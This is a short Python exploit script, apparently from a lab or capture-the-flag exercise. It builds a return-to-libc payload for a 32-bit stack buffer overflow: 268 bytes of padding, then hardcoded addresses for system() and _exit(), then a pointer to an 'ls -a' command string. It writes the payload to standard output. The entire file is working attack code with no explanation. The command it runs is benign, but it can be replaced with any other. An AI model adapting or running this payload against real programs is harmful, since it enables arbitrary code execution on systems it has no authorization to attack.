#!/usr/bin/env python3

import sys

oflow = b'A' * 268

string = b"ls -a\0"

string_addr = 0xffffd918

frames = [
        # system (0xf7e45db0), _exit (0xf7ebc8a8), 1 arg
        [ b'\xb0\x5d\xe4\xf7', b'\xa8\xc8\xeb\xf7', string_addr.to_bytes(4, byteorder='little') ]
        ]

exploit = bytearray(oflow)

for frame in frames:
    for item in frame:
        exploit.extend(item)

exploit.extend(string)
exploit.extend(b'\n')

sys.stdout.buffer.write(exploit)
